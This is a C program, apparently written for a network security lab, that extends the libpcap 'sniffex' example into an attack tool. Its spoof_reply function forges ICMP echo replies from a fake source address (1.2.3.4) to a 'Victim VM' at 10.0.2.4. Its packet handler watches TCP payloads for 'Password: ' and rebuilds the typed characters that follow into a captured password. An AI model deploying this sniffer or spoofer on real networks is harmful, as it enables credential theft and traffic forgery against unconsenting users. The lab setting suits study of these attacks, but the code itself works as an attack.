#define APP_NAME "sniffex"
#define APP_DESC "Sniffer example using libpcap"
#define APP_COPYRIGHT "Copyright (c) 2005 The Tcpdump Group"
#define APP_DISCLAIMER "THERE IS ABSOLUTELY NO WARRANTY FOR THIS PROGRAM."

#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <inttypes.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN 6

/* Ethernet header */
struct sniff_ethernet
{
    u_char ether_dhost[ETHER_ADDR_LEN]; /* destination host address */
    u_char ether_shost[ETHER_ADDR_LEN]; /* source host address */
    u_short ether_type;                 /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip
{
    u_char ip_vhl;                 /* version << 4 | header length >> 2 */
    u_char ip_tos;                 /* type of service */
    u_short ip_len;                /* total length */
    u_short ip_id;                 /* identification */
    u_short ip_off;                /* fragment offset field */
#define IP_RF 0x8000               /* reserved fragment flag */
#define IP_DF 0x4000               /* don't fragment flag */
#define IP_MF 0x2000               /* more fragments flag */
#define IP_OFFMASK 0x1fff          /* mask for fragmenting bits */
    u_char ip_ttl;                 /* time to live */
    u_char ip_p;                   /* protocol */
    u_short ip_sum;                /* checksum */
    struct in_addr ip_src, ip_dst; /* source and dest address */
};
#define IP_HL(ip) (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip) (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp
{
    u_short th_sport; /* source port */
    u_short th_dport; /* destination port */
    tcp_seq th_seq;   /* sequence number */
    tcp_seq th_ack;   /* acknowledgement number */
    u_char th_offx2;  /* data offset, rsvd */
#define TH_OFF(th) (((th)->th_offx2 & 0xf0) >> 4)
    u_char th_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN | TH_SYN | TH_RST | TH_ACK | TH_URG | TH_ECE | TH_CWR)
    u_short th_win; /* window */
    u_short th_sum; /* checksum */
    u_short th_urp; /* urgent pointer */
};

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void print_payload(const u_char *payload, int len);

void print_hex_ascii_line(const u_char *payload, int len, int offset);

void print_app_banner(void);

void print_app_usage(void);

/*
 * app name/banner
 */
void print_app_banner(void)
{

    printf("%s - %s\n", APP_NAME, APP_DESC);
    printf("%s\n", APP_COPYRIGHT);
    printf("%s\n", APP_DISCLAIMER);
    printf("\n");

    return;
}

/*
 * print help text
 */
void print_app_usage(void)
{

    printf("Usage: %s [interface]\n", APP_NAME);
    printf("\n");
    printf("Options:\n");
    printf("    interface    Listen on <interface> for packets.\n");
    printf("\n");

    return;
}

/*
 * print data in rows of 16 bytes: offset   hex   ascii
 *
 * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
 */
void print_hex_ascii_line(const u_char *payload, int len, int offset)
{

    int i;
    int gap;
    const u_char *ch;

    /* offset */
    printf("%05d   ", offset);

    /* hex */
    ch = payload;
    for (i = 0; i < len; i++)
    {
        printf("%02x ", *ch);
        ch++;
        /* print extra space after 8th byte for visual aid */
        if (i == 7)
            printf(" ");
    }
    /* print space to handle line less than 8 bytes */
    if (len < 8)
        printf(" ");

    /* fill hex gap with spaces if not full line */
    if (len < 16)
    {
        gap = 16 - len;
        for (i = 0; i < gap; i++)
        {
            printf("   ");
        }
    }
    printf("   ");

    /* ascii (if printable) */
    ch = payload;
    for (i = 0; i < len; i++)
    {
        if (isprint(*ch))
            printf("%c", *ch);
        else
            printf(".");
        ch++;
    }

    printf("\n");

    return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void print_payload(const u_char *payload, int len)
{

    int len_rem = len;
    int line_width = 16; /* number of bytes per line */
    int line_len;
    int offset = 0; /* zero-based offset counter */
    const u_char *ch = payload;

    if (len <= 0)
        return;

    /* data fits on one line */
    if (len <= line_width)
    {
        print_hex_ascii_line(ch, len, offset);
        return;
    }

    /* data spans multiple lines */
    for (;;)
    {
        /* compute current line length */
        line_len = line_width % len_rem;
        /* print line */
        print_hex_ascii_line(ch, line_len, offset);
        /* compute total remaining */
        len_rem = len_rem - line_len;
        /* shift pointer to remaining bytes to print */
        ch = ch + line_len;
        /* add offset */
        offset = offset + line_width;
        /* check if we have line width chars or less */
        if (len_rem <= line_width)
        {
            /* print last line and get out */
            print_hex_ascii_line(ch, len_rem, offset);
            break;
        }
    }

    return;
}
// checksum function
unsigned short csum(unsigned short *buf, int len)
{
    unsigned long sum;
    for (sum = 0; len > 0; len--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void spoof_reply(const struct sniff_ip *ip)
{
    int sd;                 // socket
    struct sockaddr_in sin; // socket transport address
    char buffer[2048];      // buffer

    memset(buffer, 0, 2048); // zero out the buffer

    /* STEP 1: CREATE A RAW SOCKET */
    sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (sd < 0)
    {
        perror("socket() error");
        exit(2);
    }
    printf("Socket created successfully.\n");

    /* STEP 2: SET SOCKET OPTIONS */
    sin.sin_family = AF_INET;                    // address family
    sin.sin_addr.s_addr = inet_addr("10.0.2.4"); // Victim VM IP address

    /* STEP 3: CONSTRUCT PACKET */
    struct iphdr *iph = (struct iphdr *)buffer;                                // ip header
    struct icmphdr *icmph = (struct icmphdr *)(buffer + sizeof(struct iphdr)); // icmp header

    char payload[] = "Howdy!"; // easy message

    // create IP header
    iph->ihl = 5;                                                                   // header length is always 5
    iph->version = 4;                                                               // IPv4
    iph->tos = 0;                                                                   // may not need this                                                                // type of service
    iph->tot_len = sizeof(payload) + sizeof(struct iphdr) + sizeof(struct icmphdr); // total length of ip datagram
    iph->id = 0xefbe;                                                               // packet id
    iph->frag_off = 0;                                                              // offset
    iph->ttl = 10;                                                                  // time to live                                                                  // offset
    iph->protocol = IPPROTO_ICMP;                                                   // ICMP protocol                                                               // checksum set to 0
    iph->saddr = inet_addr("1.2.3.4");                                              // source ip address                                 // source ip
    iph->daddr = sin.sin_addr.s_addr;                                               // find this address                                       // dest ip                         // get checksum value

    // create ICMP header
    icmph->type = ICMP_ECHOREPLY;         // type 8 = echo request
    icmph->code = 0;                      // code for echo reply = 0
    icmph->un.echo.id = htons(0xdeef);    // set id to some 2-byte code
    icmph->un.echo.sequence = htons(0x1); // sequence of packets

    // append payload
    memcpy(buffer + sizeof(struct icmphdr) + sizeof(struct iphdr), payload, sizeof(payload));

    /* STEP 4: SEND PACKET THROUGH RAW SOCKET */
    // compute checksum for validaton
    //icmph->checksum = csum((u_short *)icmph, sizeof(struct icmphdr) + sizeof(payload));

    // send packet
    if (sendto(sd, buffer, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
    {
        perror("sendto() failed");
        exit(3);
    }
    printf("Packet sent successfully.\n");

    // close socket
    close(sd);
}
/*
 * dissect/print packet
 */
static char pwd[65] = {};
static int pwdDetected = 0;
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{

    static int count = 1; /* packet counter */

    /* declare pointers to packet headers */
    const struct sniff_ethernet *ethernet; /* The ethernet header [1] */
    const struct sniff_ip *ip;             /* The IP header */
    const struct sniff_tcp *tcp;           /* The TCP header */
    char *payload;                         /* Packet payload */

    int size_ip;
    int size_tcp;
    int size_payload;

    printf("\nPacket number %d:\n", count);
    count++;

    /* define ethernet header */
    ethernet = (struct sniff_ethernet *)(packet);

    /* define/compute ip header offset */
    ip = (struct sniff_ip *)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;
    if (size_ip < 20)
    {
        printf("   * Invalid IP header length: %u bytes\n", size_ip);
        return;
    }

    /* print source and destination IP addresses */
    printf("       From: %s\n", inet_ntoa(ip->ip_src));
    printf("         To: %s\n", inet_ntoa(ip->ip_dst));

    /* determine protocol */
    switch (ip->ip_p)
    {
    case IPPROTO_TCP:
        printf("   Protocol: TCP\n");
        break;
    case IPPROTO_UDP:
        printf("   Protocol: UDP\n");
        return;
    case IPPROTO_ICMP:
        printf("   Protocol: ICMP\n");
        spoof_reply(ip);
        return;
    case IPPROTO_IP:
        printf("   Protocol: IP\n");
        return;
    default:
        printf("   Protocol: unknown\n");
        return;
    }

    /*
	 *  OK, this packet is TCP.
	 */

    /* define/compute tcp header offset */
    tcp = (struct sniff_tcp *)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;
    if (size_tcp < 20)
    {
        printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
        return;
    }

    printf("   Src port: %d\n", ntohs(tcp->th_sport));
    printf("   Dst port: %d\n", ntohs(tcp->th_dport));

    /* define/compute tcp payload (segment) offset */
    payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);

    /* compute tcp payload (segment) size */
    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
    printf("   Payload (%d bytes):\n", size_payload);

    // password capture
    if (size_payload > 0)
    {
        print_payload(payload, size_payload);

        if (pwdDetected == 0 && strstr(payload, "Password: ") != NULL) // we have not begun password capture yet, check if word Password is in the payload
        {
            pwdDetected = 1; // if the word password is in the payload before the capture begins, a password is about to be entered
            printf("Password detected!");
        }
        else if (pwdDetected == 1) //if password detected variable is 1, we are trying to now capture the characters entered bc this is a password
        {
            printf("Saving characters...");
            if (size_payload == 1 && *payload != 0x0d) // we only care about characters in the password, so the bytes must be 1
            {
                strcat(pwd, payload); // size of packet is 1, password is being read SO: append the character to the pwd string
                printf("Character added to pwd!");
            }
            else if (*payload == 0x0d) // when enter is detected, print the captured password and reset variables
            {
                printf("End of password stream!");
                strcat(pwd, "\n");
                printf("    Captured password: %s", pwd);
                // reset password string and pwdDetected values
                memset(pwd, 0, 65);
                pwdDetected = 0;
            }
        }
    }

    return;
}

int main(int argc, char **argv)
{

    char *dev = NULL;              /* capture device name */
    char errbuf[PCAP_ERRBUF_SIZE]; /* error buffer */
    pcap_t *handle;                /* packet capture handle */

    char filter_exp[] = "icmp and (src host not 1.2.3.4)"; /* filter expression [3] */
    struct bpf_program fp;      /* compiled filter program (expression) */
    bpf_u_int32 mask;           /* subnet mask */
    bpf_u_int32 net;            /* ip */
    int num_packets = 25;       /* number of packets to capture */

    print_app_banner();

    /* check for capture device name on command-line */
    if (argc == 2)
    {
        dev = argv[1];
    }
    else if (argc > 2)
    {
        fprintf(stderr, "error: unrecognized command-line options\n\n");
        print_app_usage();
        exit(EXIT_FAILURE);
    }
    else
    {
        /* find a capture device if not specified on command-line */
        dev = pcap_lookupdev(errbuf);
        if (dev == NULL)
        {
            fprintf(stderr, "Couldn't find default device: %s\n",
                    errbuf);
            exit(EXIT_FAILURE);
        }
    }

    /* get network number and mask associated with capture device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
    {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
                dev, errbuf);
        net = 0;
        mask = 0;
    }

    /* print capture info */
    printf("Device: %s\n", dev);
    printf("Number of packets: %d\n", num_packets);
    printf("Filter expression: %s\n", filter_exp);

    /* collect user choice for offline or live sniffing */
    printf("What do you want to capture, live or offline traffic? (live=1, offline=0): ");
    int mode;
    scanf("%d", &mode);

    if (mode == 0) // if user chooses offline option
    {
        /* open capture "device" */
        FILE *file = fopen("tfsession.pcap", "r");
        handle = pcap_fopen_offline(file, errbuf);
        if (handle == NULL)
        {
            fprintf(stderr, "Couldn't open file %s: %s\n", dev, errbuf);
            exit(EXIT_FAILURE);
        }
    }

    else // if user did not choose offline option
    {
        /* open capture device */

        handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
        if (handle == NULL)
        {
            fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
            exit(EXIT_FAILURE);
        }

        /* make sure we're capturing on an Ethernet device [2] */
        if (pcap_datalink(handle) != DLT_EN10MB)
        {
            fprintf(stderr, "%s is not an Ethernet\n", dev);
            exit(EXIT_FAILURE);
        }

        /* compile the filter expression */
        if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1)
        {
            fprintf(stderr, "Couldn't parse filter %s: %s\n",
                    filter_exp, pcap_geterr(handle));
            exit(EXIT_FAILURE);
        }

        /* apply the compiled filter */
        if (pcap_setfilter(handle, &fp) == -1)
        {
            fprintf(stderr, "Couldn't install filter %s: %s\n",
                    filter_exp, pcap_geterr(handle));
            exit(EXIT_FAILURE);
        }
    }

    /* now we can set our callback function */
    pcap_loop(handle, num_packets, got_packet, NULL);

    /* cleanup */
    pcap_freecode(&fp);
    pcap_close(handle);

    printf("\nCapture complete.\n");

    return 0;
}